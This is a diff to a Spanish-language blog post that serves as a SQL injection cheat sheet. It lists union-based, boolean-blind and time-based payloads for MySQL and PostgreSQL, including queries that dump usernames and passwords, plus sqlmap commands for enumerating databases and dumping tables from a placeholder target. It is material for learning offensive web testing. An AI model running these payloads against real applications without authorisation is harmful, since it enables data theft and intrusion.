@@ -1,10 +1,10 @@
 ---
 layout: post
-title: "SQL Injection"
+title: "SQL Injection — Union, Blind y Time-based"
 date: 2025-01-20
 categories: [ciberseguridad]
 tags: [web, sqli, owasp, hacking, sqlmap]
-description: "Técnicas de inyección SQL: Union-based, Blind, Time-based y sqlmap."
+description: "Técnicas de inyección SQL: Union-based, Blind, Time-based y automatización con sqlmap."
 ---
 
 ## ¿Qué es SQL Injection?
@@ -26,22 +26,37 @@ Vulnerabilidad que permite interferir con las consultas que una aplicación hace
 -- Número de columnas
 ' ORDER BY 3--
 
--- Extraer datos
-' UNION SELECT username,password,NULL FROM users--
+-- Columna visible
+' UNION SELECT NULL,NULL,NULL--
 
--- Tablas
+-- Extraer base de datos
+' UNION SELECT database(),NULL,NULL--
+
+-- Listar tablas
 ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Dump usuarios
+' UNION SELECT username,password,NULL FROM users--
 ```
 
-## Blind SQLi
+## Blind SQLi — Boolean
 
 ```sql
--- Boolean
-' AND 1=1--
-' AND 1=2--
+' AND 1=1--   -- verdadero
+' AND 1=2--   -- falso
 
--- Time-based MySQL
+-- Extraer carácter a carácter
+' AND SUBSTRING(username,1,1)='a'--
+```
+
+## Time-based Blind
+
+```bash
+# MySQL
 ' AND SLEEP(5)--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
 ```
 
 ## sqlmap
@@ -50,12 +65,12 @@ Vulnerabilidad que permite interferir con las consultas que una aplicación hace
 # Básico
 sqlmap -u "http://target.com/page?id=1" --dbs
 
-# Con cookies
+# Con cookie de sesión
 sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --dbs
 
-# Dump tabla
+# Dump de tabla
 sqlmap -u "http://target.com/page?id=1" -D db -T users --dump
 
-# Con Burp request
+# Desde Burp request
 sqlmap -r request.txt --level=5 --risk=3
 ```
